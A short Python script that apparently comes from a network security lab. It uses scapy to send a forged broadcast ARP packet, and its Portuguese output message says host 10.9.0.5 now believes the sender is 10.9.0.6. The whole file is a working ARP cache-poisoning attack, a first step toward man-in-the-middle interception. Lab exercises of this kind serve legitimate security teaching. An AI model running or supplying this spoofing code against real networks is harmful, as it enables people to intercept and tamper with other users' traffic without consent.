import scapy.all as scapy
from uuid import getnode as getmac

def get_localmac():
   try:
      mac = open('/sys/class/net/br-8ab3e65214d4/address').readline()
   except:
      mac = "00:00:00:00:00:00"
   return mac[0:17]

# we will send the packet to the target by pretending being the spoofed
def spoof(mac, spoofed_src, dest):
   pkt=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=dest, hwsrc=mac, psrc=spoofed_src)
   # pkt.show()
   scapy.sendp(pkt, iface="br-8ab3e65214d4", verbose=False)

def main():
   mac = get_localmac()
   spoof(mac, "10.9.0.6", "10.9.0.5")
   print(f'Pacote ARP enviado! 10.9.0.5 agora acha que somos o 10.9.0.6!')

if __name__ == "__main__":
   main()